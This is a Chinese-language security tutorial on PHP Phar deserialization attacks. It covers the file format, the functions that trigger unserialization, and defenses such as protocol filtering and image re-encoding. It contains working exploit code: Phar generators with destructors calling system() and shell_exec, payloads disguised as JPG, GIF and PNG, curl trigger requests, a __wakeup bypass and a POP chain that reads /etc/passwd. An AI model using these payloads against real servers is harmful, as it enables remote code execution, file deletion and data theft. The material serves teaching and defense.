---
title: PHP Phar反序列化
date: 2026-04-15 08:00:00
tags:
  - Web安全
  - 反序列化
  - 渗透测试
categories: 渗透测试
---

## 前言

PHP反序列化漏洞中，传统利用依赖`unserialize()`。然而Phar协议提供了一条**不依赖`unserialize()`即可反序列化**的路径：只要程序对用户可控的路径使用`file_exists`、`is_file`等文件操作函数，攻击者上传恶意Phar文件后即可触发反序列化，进而通过POP链实现代码执行。

本文涵盖Phar反序列化原理、构造方法、CVE-2016-7124绕过及防御措施。

## Phar文件结构

Phar（PHP Archive）是PHP 5.3起引入的归档格式，由四部分组成：

```
| Stub | Manifest | File Contents | Signature |
```

### 1. Stub（引导段）

头部PHP代码段，必须包含`__HALT_COMPILER(); ?>`作为结束标识。PHP解析器遇到此函数停止编译，后续数据即为Phar归档。注意Stub可以是任意PHP代码。

### 2. Manifest（清单段）

存储包内所有文件的元数据，格式类似于：

```php
[
    'total_files' => ...,
    'version'     => ...,
    'files'       => [
        [
            'name'      => ...,
            'metadata'  => ...,   // ★ 攻击点：序列化存储，解析时自动反序列化
            'timestamp' => ...,
            'size'      => ...,
        ]
    ],
]
```

**核心漏洞**：Manifest中的`metadata`字段在Phar文件被解析时，PHP会自动调用`unserialize()`将其反序列化。攻击者在此处植入恶意对象，即可在任意文件操作函数触发时完成反序列化攻击。

### 3. File Contents（内容段）

Phar包内各文件的原始内容，构造时必须至少包含一个文件。

### 4. Signature（签名段）

文件末尾的完整性校验数据，支持SHA1、SHA256、SHA512和MD5（PHP 5.x）。手工修改Phar二进制数据后需重新计算签名，否则文件校验失败。

## 反序列化触发原理

PHP提供了`phar://`流包装器访问Phar包内的文件。当以下函数操作Phar文件时，PHP底层会解析Manifest并自动反序列化`metadata`：

- `file_exists()` / `is_file()` / `is_dir()` / `filesize()` / `stat()` / `lstat()`
- `file_get_contents()` / `fopen()` / `readfile()` / `include()` / `require()`
- `opendir()` / `scandir()` / `glob()` / `copy()` / `rename()` / `unlink()`
- `parse_ini_file()` / `getimagesize()` / `fileatime()` / `filemtime()`

触发流程：

```
文件操作函数(path)
  → PHP检测Phar文件格式 → 解析Stub定位Manifest
    → 读取metadata → 执行unserialize(metadata)
      → 触发__wakeup() / __destruct() 等魔术方法
        → POP链利用 → 代码执行
```

**关键细节**：即使不使用`phar://`协议，仅传入Phar文件的原始路径，`file_exists`、`is_file`等函数也会在判断文件类型时解析Manifest，从而触发反序列化。Phar文件的识别不依赖扩展名——`.jpg`、`.png`结尾的Phar文件同样被解析。

## 构造恶意Phar文件

```php
<?php
// exploit-gen.php — 需 php -d phar.readonly=0 执行

class Evil {
    public $cmd = 'id';

    public function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('payload.phar');
$phar->startBuffering();

// Stub必须以 __HALT_COMPILER(); ?> 结尾
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// 必须至少添加一个文件
$phar->addFromString('test.txt', 'hello');

// ★ 将恶意对象设为metadata
$phar->setMetadata(new Evil());

$phar->stopBuffering();

// 改扩展名绕过上传限制
rename('payload.phar', 'payload.jpg');
echo "[+] payload.jpg generated.\n";
```

执行：`php -d phar.readonly=0 exploit-gen.php`（因为`php.ini`默认`phar.readonly=On`禁止写入）。

生成的`payload.jpg`表面是图片，本质是合法Phar文件，上传后即可用于攻击。

## 文件操作触发演示

### 目标代码

```php
<?php
// vuln.php — 典型漏洞场景

class FileDelete {
    public $filename = '/var/www/html/index.php';

    public function __destruct() {
        if (file_exists($this->filename)) {
            unlink($this->filename);
        }
    }
}

$file = $_GET['file'];
// 仅使用了 file_exists 判断文件存在性
// 但传入Phar文件路径就会触发反序列化
if (file_exists($file)) {
    echo "File exists: $file";
}
```

### 攻击步骤

```bash
# 1. 生成恶意Phar（FileDelete类，设置删除目标的关键文件）
php -d phar.readonly=0 gen.php

# 2. 上传payload.jpg到 /var/www/html/uploads/payload.jpg

# 3. 触发 — 使用phar://协议：
curl "http://target/vuln.php?file=phar:///var/www/html/uploads/payload.jpg"

# 4. 或者直接路径（file_exists同样触发）：
curl "http://target/vuln.php?file=/var/www/html/uploads/payload.jpg"
```

## CVE-2016-7124: __wakeup() 绕过

### 漏洞原理

当序列化字符串中对象属性个数值**大于**实际属性个数时，PHP跳过`__wakeup()`调用。

受影响版本：PHP 5 < 5.6.25，PHP 7 < 7.0.10。

```
// 正常 — 触发 __wakeup()
O:8:"MyClass":1:{s:3:"cmd";s:2:"id";}   // 属性计数1 = 实际1

// 绕过 — 跳过 __wakeup()
O:8:"MyClass":2:{s:3:"cmd";s:2:"id";}   // 属性计数2 > 实际1
```

### 在Phar中的应用

生成Phar后手工修改metadata中的序列化属性计数，然后重新计算签名：

```php
<?php
class Dangerous {
    public $cmd = 'whoami';

    public function __wakeup() {
        $this->cmd = 'safe';  // __wakeup防御：重置危险属性
    }

    public function __destruct() {
        system($this->cmd);
    }
}

// 生成Phar
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('x.txt', 'x');
$phar->setMetadata(new Dangerous());
$phar->stopBuffering();

// 读二进制，修改属性计数值
$data = file_get_contents('payload.phar');
// Dangerous序列化: O:10:"Dangerous":1:{...}
// 将1改为2
$data = str_replace(
    'O:10:"Dangerous":1:',
    'O:10:"Dangerous":2:',
    $data
);

// 注意：直接替换会破坏签名。更稳妥的做法是用Python脚本
// 精确解析Phar二进制格式后修改并重算SHA1签名。
// 推荐工具：phpggc -p phar -o payload.jpg GadgetChain command
file_put_contents('payload-bypass.phar', $data);
```

## POP链实战示例

```php
<?php
class A {
    public $obj;
    public function __destruct() { echo $this->obj; }  // 触发B::__toString()
}

class B {
    public $cmd;
    public function __toString() { return shell_exec($this->cmd); }
}

// 构造链：A::__destruct → echo B → B::__toString → shell_exec
$b = new B(); $b->cmd = 'cat /etc/passwd';
$a = new A(); $a->obj = $b;

$phar = new Phar('pop.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('x.txt', 'x');
$phar->setMetadata($a);
$phar->stopBuffering();
```

常见POP链起点：`__destruct()`、`__wakeup()`、`__toString()`、`__call()`、`__get()`、`__set()`。推荐使用[phpggc](https://github.com/ambionics/phpggc)快速生成流行框架的现成利用链。

## 绕过技巧与坑点

### 1. 图片头伪装有文件类型检测

```php
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');              // GIF头
$phar->setStub("\xFF\xD8\xFF\xE0<?php __HALT_COMPILER(); ?>");    // JPEG头
$phar->setStub("\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php __HALT_COMPILER(); ?>"); // PNG头
```

### 2. 二次压缩破坏格式

目标对上传文件进行缩略图生成、压缩等二次处理时，Phar二进制结构可能被破坏。需寻找不被二次处理的文件类型或上传目录。

### 3. phar://仅限本地

`phar://`只能操作本地文件系统，攻击者必须找到上传点将Phar落盘。

### 4. PHP配置影响

- `phar.readonly=On`：仅限制**写入**，不影响读取解析。本地生成Phar上传即可绕过。
- `open_basedir`：限制可访问目录范围，但范围内的文件仍受影响。

### 5. getimagesize() 双重利用

`getimagesize()`既被用于上传文件类型校验，又是触发Phar反序列化的函数。攻击者将Phar伪装为图片（使用图片头Stub）上传，目标调`getimagesize()`校验时就已触发攻击，后续`die('Invalid image')`不会执行。

```php
$info = getimagesize($_FILES['avatar']['tmp_name']);
// ↑ 已触发反序列化！后续代码不再执行
if ($info === false) { die('Invalid image'); }
```

### 6. 签名重算问题

手工修改Phar二进制数据后，文件末尾的签名失效。Phar末尾结构：

```
[Hash Value: 20/32/64 bytes][Signature Flag: 4 bytes][GBMB magic: 4 bytes]
Signature Flag: 0x01=MD5, 0x02=SHA1, 0x04=SHA256, 0x08=SHA512
```

推荐使用phpggc等成熟Phar生成工具，避免手动操作引入签名错误。

## 防御方案

### 1. 过滤 phar:// 协议并限制文件路径

```php
function safe_file_op($path) {
    // 禁止 phar:// 协议
    if (preg_match('/^(phar|zip|compress\.zlib|compress\.bzip2):\/\//i', $path)) {
        throw new Exception('Protocol not allowed');
    }
    return file_exists($path);
}

// 更根本的：不让用户控制完整文件路径
$user_file = $_GET['file'];
$safe_path = '/var/www/uploads/' . basename($user_file);
```

### 2. 检查文件内容并转写

```php
// 检测 __HALT_COMPILER 标识
if (strpos(file_get_contents($path), '__HALT_COMPILER') !== false) {
    unlink($path);
    die('Invalid file');
}

// 使用GD库重写图片，彻底破坏Phar结构
$img = imagecreatefromstring(file_get_contents($uploaded_file));
imagejpeg($img, $target_path . 'safe_' . $filename, 90);
imagedestroy($img);
```

### 3. 升级PHP版本

确保版本 >= 5.6.25 / >= 7.0.10，修复CVE-2016-7124。注意PHP 8.0+中Phar反序列化仍然有效，升级不能根除。

### 4. 代码审计要点

- 审查所有文件操作函数的调用，确认路径是否用户可控。
- 关注`file_exists`、`is_file`、`is_dir`、`filesize`等看似"只读"的函数。
- 避免将用户输入直接拼接进文件路径，始终使用`basename()`或白名单校验。
- 对上传文件做内容级别的检查和转写，而非仅扩展名校验。

## 总结

Phar反序列化是一种触发面广、隐蔽性强的攻击方式：

1. **触发面广**：几乎所有文件操作函数都可能成为入口。
2. **隐蔽性强**：攻击载荷可伪装为常见文件类型。
3. **不依赖unserialize()**：无需目标代码中存在显式反序列化调用。
4. **可结合POP链**：与框架（ThinkPHP、Laravel等）已有的POP链结合实现RCE。

防御关键是限制用户对文件路径的控制、检查上传文件真实类型、对上传文件进行内容转写，并在代码审计中重点关注文件操作函数的安全性。

## 免责声明

本文所述技术仅供安全研究和授权测试使用。任何未经授权的攻击行为均属违法，与作者无关。请读者在合法合规的前提下学习安全技术，共同提升网络安全防御水平。

---
**参考资料：**

- [PHP Manual — Phar](https://www.php.net/manual/en/book.phar.php)
- [CVE-2016-7124](https://bugs.php.net/bug.php?id=72663)
- [File Operation Induced Unserialization via phar:// — Sam Thomas / RIPS Tech](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [利用phar拓展PHP反序列化漏洞攻击面 — Seebug](https://paper.seebug.org/680/)
- [phpggc — PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
